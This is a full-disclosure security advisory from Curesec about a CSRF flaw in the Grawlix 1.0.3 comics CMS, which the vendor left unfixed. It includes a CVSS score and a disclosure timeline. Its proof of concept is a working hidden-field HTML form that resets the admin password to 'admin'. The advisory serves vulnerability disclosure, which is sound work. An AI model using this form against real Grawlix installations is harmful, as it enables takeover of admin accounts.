@@ -1,0 +1,73 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    Grawlix 1.0.3
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://www.getgrawlix.com/
+Vulnerability Type:  CSRF
+Remote Exploitable:  Yes
+Reported to vendor:  11/17/2015
+Disclosed to public: 12/21/2015
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+CVSS
+
+Medium 5.1 AV:N/AC:H/Au:N/C:P/I:P/A:P
+
+Description
+
+Grawlix is a CMS for publishing comics, which is written in PHP. In version
+1.0.3, it does not have CSRF protection, which means that an attacker can
+perform actions for a victim, if the victim visits an attacker controlled site
+while logged in.
+
+An attacker can for example change the password of an existing admin account,
+which may in turn lead to code execution via a different vulnerability in the
+admin area.
+
+3. Proof of Concept
+
+Change admin password:
+
+
+<html>
+  <body>
+    <form action="http://localhost/grawlix-1.0.3/grawlix-1.0.3/_admin/user.config.php" method="POST">
+      <input type="hidden" name="username[1]" value="admin" />
+      <input type="hidden" name="email[1]" value="admin@example.com" />
+      <input type="hidden" name="password[1]" value="admin" />
+      <input type="hidden" name="confirm_password[1]" value="admin" />
+      <input type="hidden" name="submit" value="save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+4. Solution
+
+This issue was not fixed by the vendor.
+
+5. Report Timeline
+
+11/17/2015 Informed Vendor about Issue (no reply)
+12/10/2015 Reminded Vendor of Disclosure Date (no reply)
+12/21/2015 Disclosed to public
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/Grawlix-103-CSRF-128.html
+ 
+--
+blog:  https://blog.curesec.com
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Romain-Rolland-Str 14-24
+13089 Berlin, Germany
